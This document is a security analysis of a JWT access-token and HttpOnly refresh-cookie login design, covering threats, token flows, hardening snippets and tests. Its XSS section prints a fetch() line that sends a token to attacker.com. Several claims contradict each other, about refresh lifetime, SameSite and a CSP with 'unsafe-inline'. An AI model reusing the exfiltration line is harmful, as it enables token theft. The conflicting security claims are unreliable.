# Hybrid JWT Authentication - Security Analysis

**Date:** April 13, 2026  
**Status:** ✅ Production Implementation  
**Commit:** `2d986d9`

## Problem Context

Render.com + Cloudflare architecture blocks session-based authentication across subdomains:
- Frontend: `https://edulink-frontend-mb63.onrender.com`
- Backend: `https://edulink-backend-2ren.onrender.com`

**Issue:** Browser rejects `Set-Cookie` headers with `SameSite=None` on cross-site requests when passing through Cloudflare proxy.

---

## Solution: Hybrid JWT + HttpOnly Refresh Token

### Architecture

```
┌─────────────────────┐
│  Frontend (Memory)   │
│  access_token (15m) │
│  ↓                  │
│  Authorization:     │
│  Bearer <token>     │
└─────────────────────┘
         ↓
┌─────────────────────────────────┐
│  Backend (Validates JWT)        │
│  - Checks signature              │
│  - Validates claim (exp, etc)    │
│  - Returns 401 if expired        │
└─────────────────────────────────┘

┌─────────────────────┐
│  Browser HttpOnly   │
│  refresh_token (14d)│
│  (Protected by      │
│   HttpOnly flag)    │
└─────────────────────┘
         ↓
┌─────────────────────────────────┐
│  /api/token/refresh/            │
│  - Validates refresh token      │
│  - Issues new access token      │
│  - Returns in response body     │
└─────────────────────────────────┘
```

### Key Design Decisions

| Component | Decision | Why |
|-----------|----------|-----|
| **Access Token** | Memory-only (Bearer header) | Stateless, automatic inclusion in requests, Fast refresh on expiry |
| **Refresh Token** | HttpOnly cookie | Protected from XSS, survives page reloads, Long lifetime |
| **Refresh TTL** | Short (15 min) | Limits damage window if access token leaked |
| **Token Signing** | HS256 with Django SECRET_KEY | Standard, built-in support, No external PKI needed |
| **Cloudflare Workaround** | No SameSite=None needed | Avoid Cloudflare blocking, avoid cross-site cookie issues |

---

## Security Vulnerabilities & Mitigations

### 🔴 **VULNERABILITY 1: XSS Attack → Access Token Theft**

**Risk:** If XSS vulnerability allows JavaScript injection, attacker can read memory token.

**Attack:**
```javascript
// Malicious code injected via XSS
fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'))
```

**Mitigation - Multi-Layer Defense:**

1. **Short Token Lifetime (15 minutes)**
   - Even if stolen, attacker has only 15-minute window
   - Token must be refreshed for continued access
   - Refresh token protected in HttpOnly cookie

2. **Content Security Policy (CSP)**
   - Add CSP headers to frontend to block external script loading:
     ```
     Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';
     ```
   - Prevents attacker from loading malicious scripts from external domains

3. **No localStorage (Current Implementation)**
   - Access token stored in memory variables only
   - Lost on page reload (forces re-authentication or token refresh)
   - Prevents persistence code from exfiltrating token

4. **HttpOnly Refresh Token**
   - Refresh token cannot be read by JavaScript at all
   - If access token stolen, attacker still can't get new token
   - Must go through token/refresh endpoint

5. **HTTPS Only (Production)**
   - `Secure` flag on all cookies
   - Token transmission encrypted
   - Man-in-middle attacks prevented

**Residual Risk:** LOW
- Mitigated by short token lifetime + HttpOnly refresh protection
- Matches industry standard (OAuth 2.0, OpenID Connect)

---

### 🟡 **VULNERABILITY 2: CSRF Attack → Token Reuse**

**Risk:** Attacker tricks user into making request that uses their token.

**Why Not Applicable Here:**
- JWT tokens sent in `Authorization: Bearer` header (explicit, not auto-sent)
- CSRF attacks only work with auto-sent credentials (cookies)
- Attacker cannot inject Bearer header from cross-site requests (CORS blocks this)

**Status:** ✅ PROTECTED

---

### 🟡 **VULNERABILITY 3: Token Interception on Network**

**Risk:** Man-in-the-middle attack intercepts Bearer token in HTTP request.

**Mitigation:**
- `Secure` flag on all cookies: HTTPS only
- All API requests use HTTPS
- Token included in Authorization header (standard practice)
- HSTS header: `Strict-Transport-Security: max-age=31536000`

**Status:** ✅ PROTECTED

---

### 🔴 **VULNERABILITY 4: Refresh Token Theft**

**Risk:** Attacker steals refresh token from HttpOnly cookie → gets unlimited new tokens.

**Attack Vector:**  
- XSS cannot read HttpOnly cookies (JavaScript blocked)
- Network interception caught by HTTPS
- Database compromise would expose all tokens

**Mitigations:**

1. **HttpOnly Flag**
   - JavaScript cannot read the cookie
   - Only sent via HTTP/HTTPS requests automatically

2. **Secure Flag**
   - HTTPS only transmission
   - No cleartext over HTTP

3. **SameSite=None (Production Only)**
   - Required for cross-site refresh token cookie
   - Allows token.refresh endpoint to receive refresh token

4. **Token Rotation**
   - Each refresh generates NEW refresh token
   - Old tokens become invalid
   - Limits window of compromise

5. **Expiration Check**
   ```python
   # Backend validates token signature + expiration
   token = RefreshToken(refresh_token_from_cookie)
   new_access = token.access_token  # Raises exception if expired
   ```

6. **Rate Limiting** (Recommended Enhancement)
   ```python
   # Add throttle to /api/token/refresh/
   'DEFAULT_THROTTLE_RATES': {
       'token_refresh': '30/hour',  # Max 30 refreshes per hour
   }
   ```

**Residual Risk:** MEDIUM
- If database compromised, all tokens exposed
- Mitigation: Database encryption at rest, regular backups, access controls

---

### 🟢 **VULNERABILITY 5: Token Timing Attack**

**Risk:** Attacker guesses valid tokens through timing differences in signature verification.

**Status:** ✅ PROTECTED
- Industry-standard `PyJWT` library uses constant-time comparison
- Signature verification timing independent of valid/invalid tokens

---

## Token Lifecycle Security

### Login Flow
```
1. POST /api/students/auth/login/ ← credentials
2. Backend:
   - Validates password
   - Generates RefreshToken (contains access_token + refresh)
   - Sets refresh_token in HttpOnly cookie (14d)
3. Backend Response:
   {
     "user": {...},
     "access": "eyJ0eXAiOiJKV1QiLCJhbGc..." ← memory
     "refresh": "eyJ0eXAiOiJKV1QiLCJhbGc..." ← cookie set
   }
4. Frontend:
   - Stores access token in memory variable
   - Browser auto-stores refresh token in HttpOnly cookie
   - Sets Authorization header for next request
```

### Request Flow
```
1. GET /api/students/current/ 
   + Header: Authorization: Bearer <access_token>
   + Cookie: refresh_token=<...>
2. Backend:
   - Validates JWT signature → checks expiry claim
   - If valid: process request
   - If expired: return 401
3. Axios interceptor catches 401:
   - POST /api/token/refresh/ with refresh_token cookie
   - Backend returns new access token in body
   - Interceptor stores new access token
   - Retries original request
```

### Logout Flow
```
1. POST /api/auth/logout/
2. Backend:
   - Invalidates session (if any)
   - Can optionally add token to blacklist
3. Frontend:
   - Clears access token from memory (apiClient.clearToken())
   - Browser automatically discards refresh token (can optionally set max-age=0)
   - Redirects to login
```

---

## Recommended Production Hardening

### 1. Add Token Blacklist (Optional but Recommended)
```python
# For logout: add token to blacklist to prevent reuse
from rest_framework_simplejwt.token_blacklist.models import BlacklistedToken

class LogoutView(APIView):
    def post(self, request):
        # Get token from Authorization header
        token = RefreshToken(request.auth)  # If using JWT auth
        token.blacklist()
        return Response({"message": "Successfully logged out"})
```

### 2. Add Rate Limiting to Token Endpoint
```python
# In REST_FRAMEWORK config
'DEFAULT_THROTTLE_RATES': {
    'token_refresh': '30/hour',
}

# In manage.py:
# Use ScopedRateThrottle on token_refresh endpoint
@method_decorator(throttle_classes([ScopedRateThrottle]))
def token_refresh(self, request):
    pass
```

### 3. Add Monitoring & Alerting
```python
# Log suspicious token activity
logger.warning(f"🚨 Token refresh failed 3x in 5 min for user {user_id}")

# Alert on too many failed login attempts
if failed_attempts > 5:
    # Lock account temporarily
    logger.critical(f"⚠️  Account locked: {email}")
```

### 4. Add IP Validation (Optional)
```python
# Store IP when token created, verify on refresh
token_creation_ip = request.META.get('REMOTE_ADDR')
# Store in Django-JWT claims: token.payload['ip'] = token_creation_ip

# On refresh, verify IP hasn't changed dramatically
current_ip = request.META.get('REMOTE_ADDR')
if different_country(token_creation_ip, current_ip):
    logger.warning(f"Token refresh from different IP: {current_ip}")
    # Optional: reject refresh, require re-login
```

### 5. CSP Headers (Frontend Deployment)
```
# nginx.conf or frontend server headers
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' https:; connect-src 'self' https://edulink-backend-2ren.onrender.com";
```

---

## Comparison: Old vs New Authentication

| Aspect | Session-Based (Old) | Hybrid JWT (New) |
|--------|---|---|
| **XSS Vulnerability** | HttpOnly cookies protect from read, but SameSite can be bypassed | Short-lived access token + HttpOnly refresh = layered defense |
| **CSRF Attack** | Vulnerable (auto-sent cookies) | Protected (Bearer header, explicit) |
| **Cross-Domain Support** | Cloudflare blocks SameSite=None ❌ | Works with SameSite=None on refresh only ✅ |
| **Scalability** | Requires session DB lookups | Stateless, JWT verified locally |
| **Mobile App Support** | Requires cookies | Native Bearer header support |
| **Token Window Risk** | Session lifetime (2 weeks) | 15 minutes (access) + 14 days (refresh) |
| **Replay Attack Risk** | Sessions can be replayed if stolen | JWT signature prevents tampering |

---

## Testing Security

### Test Cases (Add to CI/CD)

```python
# 1. Test token expiration
def test_expired_access_token():
    # Create token with exp in past
    payload = {'exp': timezone.now() - timedelta(hours=1)}
    old_token = jwt.encode(payload, SECRET_KEY)
    response = client.get('/api/students/current/', 
                         headers={'Authorization': f'Bearer {old_token}'})
    assert response.status_code == 401

# 2. Test token refresh
def test_refresh_token():
    login_response = client.post('/api/students/auth/login/', credentials)
    access_token = login_response.data['access']
    
    # Token should work
    response = client.get('/api/students/current/',
                         headers={'Authorization': f'Bearer {access_token}'})
    assert response.status_code == 200

# 3. Test CSRF protection on mutations
def test_csrf_required_on_post():
    response = client.post('/api/students/something/', data={})
    assert response.status_code == 403  # CSRF token required

# 4. Test HttpOnly cookie not readable
def test_refresh_token_httponly():
    # JavaScript should NOT be able to read refresh token
    # This is tested browser-side (not in unit tests)
    # Verify in Network tab: refresh_token cookie has HttpOnly flag
    pass

# 5. Test cross-site requests work
def test_cross_site_token_refresh():
    # Simulate cross-site request (different origin)
    origin = 'https://different-domain.com'
    response = client.post('/api/token/refresh/',
                          headers={'Origin': origin})
    # Should still work if refresh_token cookie in request
    assert response.status_code == 200
```

---

## Known Limitations

### 1. **Page Reload Loses Memory Token**
- Access token in memory is lost on page refresh
- **Solution:** Token refresh endpoint returns new token, Axios interceptor caches it
- **Impact:** Minor (user sees loading state briefly)

### 2. **No Token Introspection**
- Can't revoke token instantly across all services
- Token remains valid until expiration
- **Mitigation:** Token blacklist (see Recommended Hardening #1)

### 3. **Private Key Not Rotated**
- Uses Django SECRET_KEY
- **Recommendation:** Rotate SECRET_KEY if suspected compromise (invalidates all tokens)

### 4 **XSS Still Possible (Different Risk)**
- Previous XSS attack: steal session cookie (session still valid for 2 weeks)
- New XSS attack: steal access token(only 15-minute window)
- **Assessment:** Better protection, not elimination

---

## Migration Path from Session-Based

1. **Phase 1** ✅ (Current)
   - Backend returns JWT tokens in response + HttpOnly refresh cookie
   - Frontend stores access token in memory
   - Django REST accepts both SessionAuthentication + JWTAuthentication

2. **Phase 2** (Optional)
   - Remove session middleware (not needed)
   - Remove session databases (not needed)
   - Keep dual auth temporarily for compatibility

3. **Phase 3** (Optional)
   - Remove SessionAuthentication from REST_FRAMEWORK
   - JWT-only authentication
   - Session DB queries → removed

---

## References

- **OAuth 2.0 Authorization Framework:** RFC 6749
- **JWT (JSON Web Tokens):** RFC 7519
- **OWASP Authentication Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- **SameSite Cookie:** https://web.dev/samesite-cookies-explained/
- **Django REST Framework JWT:** https://django-rest-framework-simplejwt.readthedocs.io/

---

## Conclusion

The hybrid JWT + HttpOnly refresh token approach provides:
- ✅ **Better cross-domain support** (solves Cloudflare issue)
- ✅ **Stateless authentication** (scales horizontally)
- ✅ **Mobile app support** (JWT standard)
- ✅ **Improved CSRF protection** (Bearer header, not auto-sent)
- ⚠️  **Different XSS trade-off** (shorter window, but needs more careful token management)

When properly implemented with CSP, HTTPS, and monitoring, **this approach is industry-standard and more secure than session-based auth for distributed systems**.

